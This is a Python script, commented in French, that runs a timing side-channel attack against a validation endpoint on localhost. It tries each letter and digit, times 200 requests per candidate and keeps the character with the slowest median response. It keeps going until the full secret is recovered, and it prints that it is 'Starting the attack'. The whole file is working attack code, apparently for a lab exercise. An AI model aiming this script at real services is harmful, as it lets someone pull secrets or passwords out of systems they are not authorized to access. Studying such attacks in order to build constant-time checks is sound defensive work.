import time
import string
import requests
import statistics

def perform_attack():
    url = "http://127.0.0.1:5000/validate"
    extracted = ""
    num_attempts = 200  # Nombre de tentatives pour chaque caractère

    while True:  # Continue jusqu'à ce que le secret soit découvert
        max_median_time = 0
        next_char = ''

        for char in string.ascii_letters + string.digits:  # Tester les caractères alphanumériques
            test_input = extracted + char + "a"  # Ajouter un caractère supplémentaire
            times = []

            # Effectuer plusieurs requêtes pour calculer la médiane
            for _ in range(num_attempts):
                start = time.perf_counter()
                response = requests.get(url, params={"input": test_input})
                elapsed = time.perf_counter() - start
                times.append(elapsed)

            median_time = statistics.median(times)  # Calcul de la médiane
            print(f"{char} (with 'a'): {median_time}")

            if median_time > max_median_time:
                max_median_time = median_time
                next_char = char

        # Ajouter le caractère avec le temps le plus long
        extracted += next_char
        print(f"Extracted so far: {extracted}")

        # Vérifier si la chaîne complète est correcte
        response = requests.get(url, params={"input": extracted})
        if response.status_code == 200:
            print(f"Secret fully discovered: {extracted}")
            break

if __name__ == "__main__":
    print("Starting the attack...")
    perform_attack()
